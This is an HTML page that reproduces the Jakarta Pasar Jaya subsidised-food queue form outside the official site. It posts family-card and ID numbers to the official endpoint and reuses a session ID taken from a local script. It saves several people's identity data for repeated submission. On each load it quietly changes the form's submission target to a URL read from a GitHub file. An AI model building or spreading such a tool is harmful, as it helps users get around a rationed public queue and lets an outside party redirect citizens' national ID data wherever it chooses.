<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>Form Antrian</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    body { font-family: sans-serif; max-width: 600px; margin: 20px auto; padding: 20px; border: 1px solid #ccc; border-radius: 10px; }
    label { margin-top: 10px; display: block; }
    input, select { width: 100%; padding: 8px; margin-top: 4px; }
    button { margin-top: 10px; padding: 10px; width: 100%; }
    iframe { width: 100%; min-height: 150px; border: 1px solid #ddd; margin-top: 20px; }
    .captcha-box { display: flex; align-items: center; gap: 10px; margin-top: 10px; }
    .captcha-box img { border: 1px solid #ccc; height: 50px; }
    .captcha-box button { width: auto; padding: 6px 10px; }
  </style>
</head>
<body>
<div id="serverTime" style="font-weight: bold; margin-bottom: 10px;">
  Waktu Server: Memuat...
</div>
  <h2>Form Antrian</h2>

  <!-- Form -->
  <form 
    id="antrianForm"
    action="https://antrianpanganbersubsidi.pasarjaya.co.id/index.php"
    method="post"
    target="outputFrame"
    onsubmit="return handleSubmit();"
  >
    <!-- Hidden PHPSESSID -->
    <input type="hidden" id="phpsessid" name="PHPSESSID">

    <label for="tanggal_ambil">Tanggal Ambil</label>
    <input type="date" id="tanggal_ambil" name="tanggal_ambil" required>

    <label for="wilayah">Wilayah</label>
    <select id="wilayah" name="wilayah" required>
      <option value="">Pilih Wilayah</option>
      <option value="5">Jakarta Barat</option>
      <option value="1">Jakarta Pusat</option>
    </select>

    <label for="lokasi">Lokasi</label>
    <select id="lokasi" name="lokasi" required>
      <option value="">Pilih Lokasi</option>
      <option value="56">Mini DC Grogol</option>
      <option value="151">Mini DC Pasar Senen Blok III</option>
      <option value="68">Pasar Pos Pengumben</option>
    </select>

    <label for="kk">Nomor KK</label>
    <input type="text" id="kk" name="kk" required inputmode="numeric" pattern="[0-9]*" placeholder="Nomor KK">

    <label for="ktp">Nomor KTP</label>
    <input type="text" id="ktp" name="ktp" required inputmode="numeric" pattern="[0-9]*" placeholder="Nomor KTP">

    <label for="kartu">Nomor Kartu</label>
    <input type="text" id="kartu" name="kartu" required inputmode="numeric" pattern="[0-9]*" placeholder="Nomor Kartu">

    <label for="tgllahir">Tanggal Lahir</label>
    <input type="date" id="tgllahir" name="tgllahir" required>

    <!-- CAPTCHA -->
    <label for="captcha">Captcha</label>
    <div class="captcha-box">
      <img id="captchaImage" src="https://antrianpanganbersubsidi.pasarjaya.co.id/captcha.php" alt="Captcha">
      <button type="button" onclick="refreshCaptcha()">üîÑ</button>
    </div>
    <input type="text" id="captcha" name="captha" required placeholder="Masukkan kode di atas" inputmode="numeric" pattern="[0-9]*" autocomplete="off">

    <label><input type="checkbox" name="box" checked>
      *SAYA MENYATAKAN BAHWA DATA DISAMPAIKAN SUDAH BENAR DAN MEMAHAMI SYARAT YANG BERLAKU, SERTA MENGIKUTI PERATURAN YANG SUDAH DITETAPKAN.
    </label>
    <input type="hidden" name="daterange-btn" value="simpan">

    <button type="submit">Kirim</button>
  </form>

  <!-- Simpan & Load -->
  <hr>
  <label for="namaSimpan">Simpan Data Sebagai:</label>
  <input type="text" id="namaSimpan" placeholder="Contoh: Data Ramadhan">
  <button onclick="simpanData()">üíæ Simpan</button>

  <label for="dataTersimpan">Panggil Data Tersimpan:</label>
  <select id="dataTersimpan"></select>
  <button onclick="muatData()">üì§ Muat</button>
  <button onclick="location.reload()">üîÑ Refresh Halaman</button>

  <!-- Target hasil kiriman -->
  <iframe name="outputFrame" id="outputFrame"></iframe>

  <script>
    // Set tanggal ambil ke H+1
    const tanggalAmbil = document.getElementById('tanggal_ambil');
    const tomorrow = new Date();
    tomorrow.setDate(tomorrow.getDate() + 1);
    tanggalAmbil.value = tomorrow.toISOString().split("T")[0];

    // Ambil latest_url.txt dari GitHub
    async function updateFormAction() {
      const urlFile = "https://raw.githubusercontent.com/Dhaniskywalker/dhaniskywalker07/main/latest_url.txt";
      try {
        const resp = await fetch(urlFile + "?t=" + Date.now());
        if (resp.ok) {
          const newUrl = (await resp.text()).trim();
          if (newUrl) {
            document.getElementById("antrianForm").action = newUrl;
            console.log("‚úÖ Form action diperbarui ke:", newUrl);
          }
        }
      } catch (err) {
        console.warn("Gagal ambil latest_url.txt:", err);
      }
    }

    // Ambil PHPSESSID dari session.php
    async function getSession() {
      try {
        const resp = await fetch("session.php?t=" + Date.now());
        const data = await resp.json();
        if (data.phpsessid) {
          document.getElementById("phpsessid").value = data.phpsessid;
          console.log("‚úÖ PHPSESSID aktif:", data.phpsessid);
        } else {
          console.warn("‚ùå Gagal ambil PHPSESSID");
        }
      } catch (err) {
        console.error("‚ùå Error fetch session.php:", err);
      }
    }

    // Simpan data ke localStorage
    function simpanData() {
      const nama = document.getElementById('namaSimpan').value.trim();
      if (!nama) {
        alert("Masukkan nama untuk menyimpan data!");
        return;
      }
      const data = {
        wilayah: document.getElementById('wilayah').value,
        lokasi: document.getElementById('lokasi').value,
        kk: document.getElementById('kk').value,
        ktp: document.getElementById('ktp').value,
        kartu: document.getElementById('kartu').value,
        tgllahir: document.getElementById('tgllahir').value,
      };
      localStorage.setItem('data_' + nama, JSON.stringify(data));
      updateDropdown();
      alert("‚úÖ Data berhasil disimpan sebagai: " + nama);
      document.getElementById('namaSimpan').value = '';
    }

    // Update dropdown data tersimpan
    function updateDropdown() {
      const select = document.getElementById('dataTersimpan');
      select.innerHTML = '';
      for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        if (key.startsWith('data_')) {
          const option = document.createElement('option');
          option.value = key;
          option.textContent = key.replace('data_', '');
          select.appendChild(option);
        }
      }
    }

    // Muat data dari localStorage
    function muatData() {
      const selectedKey = document.getElementById('dataTersimpan').value;
      if (!selectedKey) return;
      const data = JSON.parse(localStorage.getItem(selectedKey));
      document.getElementById('wilayah').value = data.wilayah;
      document.getElementById('lokasi').value = data.lokasi;
      document.getElementById('kk').value = data.kk;
      document.getElementById('ktp').value = data.ktp;
      document.getElementById('kartu').value = data.kartu;
      document.getElementById('tgllahir').value = data.tgllahir;
    }

    // Fungsi refresh captcha
    function refreshCaptcha() {
      const img = document.getElementById('captchaImage');
      img.src = "https://antrianpanganbersubsidi.pasarjaya.co.id/captcha.php?rnd=" + Date.now();
    }

    // Validasi + refresh otomatis setelah submit
    function handleSubmit() {
      const captchaInput = document.getElementById('captcha').value.trim();
      if (!captchaInput) {
        alert("‚ö† Silakan isi captcha terlebih dahulu!");
        return false;
      }
      setTimeout(() => {
        refreshCaptcha();
        document.getElementById('captcha').value = "";
        getSession(); // ambil session baru setelah submit
      }, 500);
      return true;
    }

    // Ambil waktu server
    function fetchServerTime() {
      fetch(window.location.href, { method: 'HEAD', cache: 'no-store' })
        .then(response => {
          const dateHeader = response.headers.get('Date');
          if (dateHeader) {
            const serverDate = new Date(dateHeader);
            startServerClock(serverDate);
          } else {
            document.getElementById('serverTime').textContent = 'Waktu Server: Gagal diambil';
          }
        })
        .catch(() => {
          document.getElementById('serverTime').textContent = 'Waktu Server: Gagal diambil';
        });
    }

    // Jalankan jam berdasarkan waktu server
    function startServerClock(initialDate) {
      let currentTime = new Date(initialDate);
      function updateClock() {
        const jam = String(currentTime.getHours()).padStart(2, '0');
        const menit = String(currentTime.getMinutes()).padStart(2, '0');
        const detik = String(currentTime.getSeconds()).padStart(2, '0');
        document.getElementById('serverTime').textContent = `Waktu Server: ${jam}:${menit}:${detik}`;
        currentTime.setSeconds(currentTime.getSeconds() + 1);
      }
      updateClock();
      setInterval(updateClock, 1000);
    }

    // Inisialisasi saat halaman dimuat
    window.onload = function() {
      updateDropdown();
      fetchServerTime();
      updateFormAction();
      getSession(); // langsung ambil PHPSESSID saat pertama kali buka
    };
  </script>
</body>
</html>